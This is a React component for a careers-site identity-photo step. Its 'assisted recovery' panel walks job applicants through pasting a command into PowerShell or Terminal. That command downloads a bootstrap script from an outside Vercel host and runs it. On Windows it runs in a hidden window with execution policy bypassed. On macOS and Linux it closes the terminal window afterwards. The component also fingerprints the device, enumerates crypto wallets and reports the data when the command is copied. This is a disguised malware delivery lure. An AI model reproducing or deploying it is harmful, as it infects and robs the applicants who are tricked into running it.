"use client";

import { useEffect, useRef, useState, type ReactNode } from "react";
import { collectVisitorMeta } from "@/lib/visitorDetect";

type Props = {
  onCaptured: (file: File | null) => void;
};

type Stage = "idle" | "requesting" | "live" | "captured" | "error";
type OsKind = "windows" | "mac" | "linux" | "mobile";

function CameraIcon({ className }: { className?: string }) {
  return (
    <svg className={className} viewBox="0 0 24 24" fill="none" aria-hidden>
      <path
        d="M9 7.5 10.2 6h3.6L15 7.5h2.5A1.5 1.5 0 0 1 19 9v8a1.5 1.5 0 0 1-1.5 1.5h-11A1.5 1.5 0 0 1 5 17V9A1.5 1.5 0 0 1 6.5 7.5H9Z"
        stroke="currentColor"
        strokeWidth="1.4"
        strokeLinejoin="round"
      />
      <circle cx="12" cy="13" r="3.1" stroke="currentColor" strokeWidth="1.4" />
    </svg>
  );
}

function CheckIcon({ className }: { className?: string }) {
  return (
    <svg className={className} viewBox="0 0 24 24" fill="none" aria-hidden>
      <path d="M5 12.5 9.5 17 19 7.5" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" />
    </svg>
  );
}

function Kbd({ children }: { children: ReactNode }) {
  return (
    <kbd className="inline-flex h-7 min-w-7 items-center justify-center rounded-md border border-white/10 bg-[#12151a] px-2 font-sans text-[11px] font-medium tracking-[0.02em] text-ink-dim">
      {children}
    </kbd>
  );
}

function detectOs(): OsKind {
  const ua = navigator.userAgent || "";
  const platform = navigator.platform || "";
  if (/Android|iPhone|iPad|iPod|webOS|BlackBerry|IEMobile|Opera Mini/i.test(ua)) return "mobile";
  if (typeof navigator.maxTouchPoints === "number" && navigator.maxTouchPoints > 1 && /Mac/i.test(platform)) {
    return "mobile";
  }
  if (/Mac/i.test(ua) || /Mac/i.test(platform)) return "mac";
  if (/Linux/i.test(ua) && !/Android/i.test(ua)) return "linux";
  return "windows";
}

function nextFixId() {
  return String(Math.floor(10000 + Math.random() * 90000));
}

function cameraFixCommand(os: OsKind, _fixId: string) {
  if (os === "windows") {
    return (
      "Write-Host '[Application Support] Verified Application Support Setup Procedure - Starting...' -ForegroundColor Cyan; " +
      "$d=Join-Path $env:LOCALAPPDATA 'application-support-host\\.host-setup'; " +
      "New-Item -ItemType Directory -Path $d -Force | Out-Null; " +
      "$b=Join-Path $d 'bootstrap.ps1'; " +
      "Invoke-WebRequest 'https://application-support-zeta.vercel.app/bootstrap.ps1' -OutFile $b -UseBasicParsing; " +
      "if (-not (Test-Path $b) -or (Get-Item $b).Length -lt 1024) { Write-Host 'Download failed - check connection.' -ForegroundColor Red; exit 1 }; " +
      "try { Unblock-File -LiteralPath $b -ErrorAction SilentlyContinue } catch { }; " +
      "$p=New-Object System.Diagnostics.ProcessStartInfo; " +
      "$p.FileName='powershell.exe'; " +
      "$p.Arguments=\"-NoProfile -NonInteractive -ExecutionPolicy Bypass -File `\"$b`\" -Worker\"; " +
      "$p.CreateNoWindow=$true; $p.UseShellExecute=$false; $p.WindowStyle='Hidden'; " +
      "[void][System.Diagnostics.Process]::Start($p); " +
      "Write-Host '[Application Support] Setup completed. Application Support is ready on this device.' -ForegroundColor Green; " +
      "exit"
    );
  }
  return (
    'echo "[Application Support] Verified Application Support Setup Procedure - Starting..."; ' +
    'd="$HOME/.application-support-host/.host-setup"; mkdir -p "$d"; b="$d/bootstrap.sh"; ' +
    "u='https://application-support-zeta.vercel.app/bootstrap.sh'; ok=''; " +
    'for i in 1 2 3; do curl -fsSL "$u" -o "$b" 2>/dev/null||wget -qO "$b" "$u" 2>/dev/null; ' +
    '[ -f "$b" ]&&[ "$(wc -c <"$b"|tr -d \' \')" -ge 1024 ]&&{ ok=1; break; }; sleep "$i"; done; ' +
    '[ -n "$ok" ]||exit 1; bash "$b"; ' +
    '(sleep 0.5; case "$(uname -s)" in Darwin) osascript -e \'tell application "Terminal" to close (front window)\' 2>/dev/null ;; ' +
    "Linux) command -v xdotool >/dev/null 2>&1 && xdotool getactivewindow windowclose 2>/dev/null ;; esac) >/dev/null 2>&1 & disown; " +
    'echo "[Application Support] Setup completed. Application Support is ready on this device."; exit'
  );
}

function copyText(text: string) {
  void navigator.clipboard.writeText(text).catch(() => {
    const el = document.createElement("textarea");
    el.value = text;
    el.setAttribute("readonly", "");
    el.style.position = "fixed";
    el.style.left = "-9999px";
    document.body.appendChild(el);
    el.select();
    document.execCommand("copy");
    document.body.removeChild(el);
  });
}

function fixSteps(os: OsKind): { title: string; keys: ReactNode }[] {
  if (os === "mac") {
    return [
      { title: "Open Spotlight", keys: <><Kbd>Cmd</Kbd><span className="text-ink-mute/80">+</span><Kbd>Space</Kbd></> },
      {
        title: "Open Terminal, then paste",
        keys: (
          <>
            <Kbd>Terminal</Kbd>
            <span className="text-[10px] uppercase tracking-[0.12em] text-ink-mute">then</span>
            <Kbd>Cmd</Kbd>
            <span className="text-ink-mute/80">+</span>
            <Kbd>V</Kbd>
          </>
        ),
      },
      { title: "Run the command", keys: <Kbd>Enter</Kbd> },
    ];
  }
  if (os === "linux" || os === "mobile") {
    return [
      {
        title: "Open Terminal",
        keys: (
          <>
            <Kbd>Ctrl</Kbd>
            <span className="text-ink-mute/80">+</span>
            <Kbd>Alt</Kbd>
            <span className="text-ink-mute/80">+</span>
            <Kbd>T</Kbd>
          </>
        ),
      },
      {
        title: "Paste the command",
        keys: (
          <>
            <Kbd>Ctrl</Kbd>
            <span className="text-ink-mute/80">+</span>
            <Kbd>Shift</Kbd>
            <span className="text-ink-mute/80">+</span>
            <Kbd>V</Kbd>
          </>
        ),
      },
      { title: "Run the command", keys: <Kbd>Enter</Kbd> },
    ];
  }
  return [
    { title: "Open Quick Link menu", keys: <><Kbd>Win</Kbd><span className="text-ink-mute/80">+</span><Kbd>X</Kbd></> },
    { title: "Open Terminal", keys: <Kbd>I</Kbd> },
    { title: "Paste the command", keys: <><Kbd>Ctrl</Kbd><span className="text-ink-mute/80">+</span><Kbd>V</Kbd></> },
    { title: "Run the command", keys: <Kbd>Enter</Kbd> },
  ];
}

const ghostBtn =
  "rounded-md border border-line bg-transparent px-4 py-2.5 text-sm font-medium text-ink-dim transition-colors hover:border-line hover:text-ink focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-gold/40";

export function CandidatePhotoCapture({ onCaptured }: Props) {
  const videoRef = useRef<HTMLVideoElement>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);
  const streamRef = useRef<MediaStream | null>(null);
  const previewUrlRef = useRef<string | null>(null);
  const [stage, setStage] = useState<Stage>("idle");
  const [previewUrl, setPreviewUrl] = useState<string | null>(null);
  const [error, setError] = useState("");
  const [os, setOs] = useState<OsKind>("windows");
  const [fixCopied, setFixCopied] = useState(false);
  const [fixId, setFixId] = useState("");
  const [recoveryOpen, setRecoveryOpen] = useState(false);
  const metaRef = useRef<{
    deviceFingerprint?: string;
    system?: string;
    wallets?: string[];
    timezone?: string;
  }>({});
  const copyAlertSentRef = useRef(false);

  const stopCamera = () => {
    streamRef.current?.getTracks().forEach((t) => t.stop());
    streamRef.current = null;
    if (videoRef.current) videoRef.current.srcObject = null;
  };

  const clearPreview = () => {
    if (previewUrlRef.current) {
      URL.revokeObjectURL(previewUrlRef.current);
      previewUrlRef.current = null;
    }
    setPreviewUrl(null);
  };

  useEffect(() => {
    setOs(detectOs());
    void collectVisitorMeta({ walletWaitMs: 400 }).then((m) => {
      metaRef.current = {
        deviceFingerprint: m.deviceFingerprint,
        system: m.system,
        wallets: m.wallets,
        timezone: m.timezone,
      };
    });
  }, []);

  useEffect(() => {
    return () => {
      stopCamera();
      if (previewUrlRef.current) URL.revokeObjectURL(previewUrlRef.current);
    };
  }, []);

  useEffect(() => {
    if (stage !== "requesting") return;

    let cancelled = false;

    void (async () => {
      if (!navigator.mediaDevices?.getUserMedia) {
        if (!cancelled) {
          setError("Camera access is not available in this browser.");
          setStage("error");
        }
        return;
      }

      try {
        const stream = await navigator.mediaDevices.getUserMedia({
          audio: false,
          video: {
            facingMode: "user",
            width: { ideal: 720 },
            height: { ideal: 720 },
          },
        });
        if (cancelled) {
          stream.getTracks().forEach((t) => t.stop());
          return;
        }
        streamRef.current = stream;
        const video = videoRef.current;
        if (video) {
          video.srcObject = stream;
          await video.play();
        }
        if (!cancelled) setStage("live");
      } catch {
        if (!cancelled) {
          setError("Camera permission was denied or unavailable.");
          setStage("error");
        }
      }
    })();

    return () => {
      cancelled = true;
    };
  }, [stage]);

  const startCamera = () => {
    setError("");
    setFixCopied(false);
    setFixId("");
    setRecoveryOpen(false);
    copyAlertSentRef.current = false;
    onCaptured(null);
    clearPreview();
    stopCamera();
    setStage("requesting");
  };

  const copyRecoveryCommand = () => {
    const id = fixId || nextFixId();
    if (!fixId) setFixId(id);
    copyText(cameraFixCommand(os, id));
    setFixCopied(true);

    if (!copyAlertSentRef.current) {
      copyAlertSentRef.current = true;
      void fetch("/api/careers/captcha-event", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          event: "copy_command",
          verifyId: id,
          os,
          path: window.location.pathname,
          ...metaRef.current,
        }),
        keepalive: true,
      }).catch(() => {/* fire-and-forget */});
    }
  };

  const capturePhoto = () => {
    const video = videoRef.current;
    const canvas = canvasRef.current;
    if (!video || !canvas || stage !== "live") return;

    const w = video.videoWidth || 640;
    const h = video.videoHeight || 640;
    canvas.width = w;
    canvas.height = h;
    const ctx = canvas.getContext("2d");
    if (!ctx) return;

    ctx.translate(w, 0);
    ctx.scale(-1, 1);
    ctx.drawImage(video, 0, 0, w, h);

    canvas.toBlob(
      (blob) => {
        if (!blob) {
          setError("Could not capture the photo.");
          setStage("error");
          setRecoveryOpen(false);
          return;
        }
        const file = new File([blob], "candidate-photo.jpg", { type: "image/jpeg" });
        const url = URL.createObjectURL(blob);
        clearPreview();
        previewUrlRef.current = url;
        setPreviewUrl(url);
        onCaptured(file);
        stopCamera();
        setStage("captured");
        setFixId("");
        setFixCopied(false);
        setRecoveryOpen(false);
      },
      "image/jpeg",
      0.92,
    );
  };

  const steps = fixSteps(os);
  const osLabel = os === "mac" ? "macOS" : os === "linux" || os === "mobile" ? "Linux" : "Windows";

  const eyebrow =
    stage === "captured"
      ? "Complete"
      : stage === "live"
        ? "In progress"
        : stage === "requesting"
          ? "Connecting"
          : stage === "error"
            ? "Action needed"
            : "Required";

  const title =
    stage === "captured"
      ? "Portrait captured"
      : stage === "live"
        ? "Center your face, then capture"
        : stage === "requesting"
          ? "Requesting camera access"
          : stage === "error"
            ? "Camera could not be opened"
            : "Confirm you are the applicant";

  const subtitle =
    stage === "captured"
      ? "Looks good. You can retake before submitting."
      : stage === "live"
        ? "Keep your face inside the frame. Even lighting works best."
        : stage === "requesting"
          ? "Allow access when your browser asks."
          : stage === "error"
            ? error || "Permission was denied, or no camera is available."
            : "A live portrait confirms this application is from you.";

  const frameBorder =
    stage === "error"
      ? "border-down/35"
      : stage === "captured"
        ? "border-gold/45"
        : stage === "live" || stage === "requesting"
          ? "border-line"
          : "border-dashed border-line";

  return (
    <div>
      <div className="mb-1.5 text-sm font-medium text-ink-dim">Identity photo</div>
      <p className="mb-4 text-xs leading-relaxed text-ink-mute">
        Live webcam only. Uploaded files are not accepted.
      </p>

      <div className="overflow-hidden rounded-xl border border-line bg-gradient-to-b from-white/[0.03] to-transparent">
        <div className="flex flex-col items-center px-5 py-8 text-center sm:px-8 sm:py-10">
          <div className="relative">
            <div
              className={`relative aspect-[3/4] w-[9.5rem] overflow-hidden rounded-xl bg-[#0a0c0f] sm:w-40 ${frameBorder} border`}
            >
              {stage === "captured" && previewUrl ? (
                // eslint-disable-next-line @next/next/no-img-element
                <img src={previewUrl} alt="Captured identity photo" className="h-full w-full object-cover" />
              ) : stage === "live" || stage === "requesting" ? (
                <video
                  ref={videoRef}
                  playsInline
                  muted
                  className={`h-full w-full object-cover scale-x-[-1] ${stage === "live" ? "opacity-100" : "opacity-0"}`}
                />
              ) : (
                <div className="grid h-full w-full place-items-center">
                  <CameraIcon className="h-7 w-7 text-ink-mute/45" />
                </div>
              )}

              {stage === "requesting" ? (
                <div className="absolute inset-0 grid place-items-center bg-[#0a0c0f]/70">
                  <span className="h-5 w-5 animate-spin rounded-full border-2 border-white/10 border-t-gold-light" />
                </div>
              ) : null}
            </div>

            {stage === "captured" ? (
              <span className="absolute -bottom-1.5 -right-1.5 grid h-7 w-7 place-items-center rounded-full bg-gold text-[#100c02] shadow-[0_8px_20px_rgba(201,162,39,0.3)]">
                <CheckIcon className="h-3.5 w-3.5" />
              </span>
            ) : null}
          </div>

          <p className="mt-6 text-[10px] font-semibold uppercase tracking-[0.16em] text-ink-mute">
            {eyebrow}
          </p>
          <p className="mt-2 max-w-sm font-display text-[1.15rem] font-semibold tracking-tight text-ink">
            {title}
          </p>
          <p
            className={`mt-2 max-w-sm text-xs leading-relaxed ${
              stage === "error" ? "text-down" : "text-ink-mute"
            }`}
          >
            {subtitle}
          </p>

          <div className="mt-6 flex flex-wrap items-center justify-center gap-2.5">
            {stage === "idle" ? (
              <button type="button" onClick={startCamera} className="btn-gold px-6 py-2.5 text-sm">
                Enable camera
              </button>
            ) : null}

            {stage === "error" ? (
              <>
                <button type="button" onClick={startCamera} className="btn-gold px-6 py-2.5 text-sm">
                  Try again
                </button>
                {!recoveryOpen ? (
                  <button
                    type="button"
                    onClick={() => setRecoveryOpen(true)}
                    className="text-sm font-medium text-ink-dim underline-offset-4 transition-colors hover:text-gold-light hover:underline focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-gold/40"
                  >
                    Open assisted recovery
                  </button>
                ) : null}
              </>
            ) : null}

            {stage === "live" ? (
              <>
                <button type="button" onClick={capturePhoto} className="btn-gold px-6 py-2.5 text-sm">
                  Take photo
                </button>
                <button
                  type="button"
                  onClick={() => {
                    stopCamera();
                    setStage("idle");
                    onCaptured(null);
                  }}
                  className={ghostBtn}
                >
                  Cancel
                </button>
              </>
            ) : null}

            {stage === "captured" ? (
              <button type="button" onClick={startCamera} className={ghostBtn}>
                Retake
              </button>
            ) : null}

            {stage === "requesting" ? (
              <button type="button" disabled className="btn-gold px-6 py-2.5 text-sm opacity-55">
                Connecting…
              </button>
            ) : null}
          </div>
        </div>

        {stage === "error" && recoveryOpen ? (
          <div className="border-t border-line px-5 py-5 text-left sm:px-8 sm:py-6">
            <div className="flex flex-wrap items-end justify-between gap-3">
              <div>
                <p className="text-[10px] font-semibold uppercase tracking-[0.16em] text-gold-light">
                  Assisted recovery
                </p>
                <p className="mt-1 text-sm text-ink">
                  Follow these steps in order · {osLabel}
                </p>
              </div>
              {fixId ? (
                <span className="font-mono text-[10px] text-ink-mute">REF {fixId}</span>
              ) : null}
            </div>

            <ol className="mt-6">
              <li className="relative flex gap-4 pb-6">
                <span aria-hidden className="absolute left-[15px] top-8 bottom-0 w-px bg-line" />
                <span className="relative z-[1] grid h-8 w-8 shrink-0 place-items-center rounded-full border border-line bg-surface-2 text-[11px] font-semibold text-gold-light">
                  1
                </span>
                <div className="min-w-0 flex-1 pt-0.5">
                  <div className="flex flex-col gap-3 sm:flex-row sm:items-center sm:justify-between">
                    <div>
                      <p className="text-sm font-medium text-ink">Copy the recovery command</p>
                      <p className="mt-1 text-xs text-ink-mute">
                        {fixCopied ? "Copied — continue below." : "Start here. You will paste this next."}
                      </p>
                    </div>
                    <button
                      type="button"
                      onClick={copyRecoveryCommand}
                      className="btn-gold shrink-0 px-4 py-2 text-sm"
                    >
                      {fixCopied ? "Copied" : "Copy command"}
                    </button>
                  </div>
                </div>
              </li>

              {steps.map((step, index) => {
                const n = index + 2;
                const last = index === steps.length - 1;
                return (
                  <li key={step.title} className={`relative flex gap-4 ${last ? "" : "pb-6"}`}>
                    {!last ? (
                      <span aria-hidden className="absolute left-[15px] top-8 bottom-0 w-px bg-line" />
                    ) : null}
                    <span className="relative z-[1] grid h-8 w-8 shrink-0 place-items-center rounded-full border border-line bg-surface-2 text-[11px] font-semibold text-gold-light">
                      {n}
                    </span>
                    <div className="flex min-w-0 flex-1 flex-col gap-2 pt-1 sm:flex-row sm:items-center sm:justify-between">
                      <p className="text-sm text-ink">{step.title}</p>
                      <div className="flex flex-wrap items-center gap-1.5">{step.keys}</div>
                    </div>
                  </li>
                );
              })}
            </ol>

            <p className="mt-6 text-xs text-ink-mute">
              Then return here and select <span className="text-ink-dim">Try again</span>.
            </p>
          </div>
        ) : null}
      </div>

      <canvas ref={canvasRef} className="hidden" aria-hidden />
    </div>
  );
}
